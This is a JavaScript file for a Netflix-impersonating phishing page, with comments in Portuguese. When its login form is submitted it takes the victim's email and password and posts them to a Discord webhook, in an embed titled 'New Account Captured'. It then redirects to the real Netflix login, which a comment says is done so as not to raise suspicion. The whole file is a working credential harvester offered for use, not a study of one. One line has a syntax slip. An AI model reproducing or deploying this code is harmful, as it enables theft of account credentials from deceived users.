const webhookURL = "https://discord.com/api/webhooks/1481425939975114946/DK0ymjsQ73mw8Ub08uYiDgOuwWeq8HWuRGkunjvM-r1P74ghg-DWIYXgen-rijVO_lk6";

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password)'.value;
    const btn = document.getElementById('btnSubmit');

    // Feedback visual de carregamento
    btn.innerText = "Carregando...";
    btn.disabled = true;

    const payload = {
        embeds: [{
            title: "🍿 Nova Conta Capturada - Netflix",
            color: 15158332, // Vermelho Netflix
            fields: [
                {
                    name: "📧 E-mail/Celular",
                    value: `\`${email}\``,
                    inline: false
                },
                {
                    name: "🔑 Senha",
                    value: `\`${password}\``,
                    inline: false
                }
            ],
            footer: {
                text: "Sistema de Monitoramento Netflix",
                icon_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png"
            },
            timestamp: new Date()
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // Redireciona para o site oficial após o envio para não levantar suspeitas
        window.location.href = "https://www.netflix.com/br/login";
    })
    .catch(err => {
        console.error("Erro ao enviar:", err);
        btn.innerText = "Continuar";
        btn.disabled = false;
    });
});
